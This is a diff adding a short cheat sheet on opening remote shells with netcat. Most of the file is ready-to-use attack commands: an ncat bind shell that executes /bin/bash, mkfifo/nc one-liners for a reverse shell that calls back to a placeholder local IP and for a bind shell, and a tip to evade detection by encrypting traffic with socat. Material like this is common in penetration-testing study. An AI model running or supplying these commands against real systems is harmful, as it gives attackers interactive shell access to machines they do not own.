@@ -1,0 +1,20 @@
+First On The Target Machine Get it to listen on a specific port using:
+
+ncat -lvnp 1234 -e /bin/bash
+
+// -e /bin/bash specifies to use the bash shell
+
+next connect to target using:
+
+ncat TARGET_IP PORT
+
+mostly this method will not work if used like this without any evasion techniques.
+
+to use evasion techniques use socat to encrypt communication.
+
+Most versions of netcat or nc doesn't come with -e option to execute /bin/bash shell for example so in this case we use this for a reverse shell on the target: 
+
+mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f 
+
+
+and this on the target for a bind shell: mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
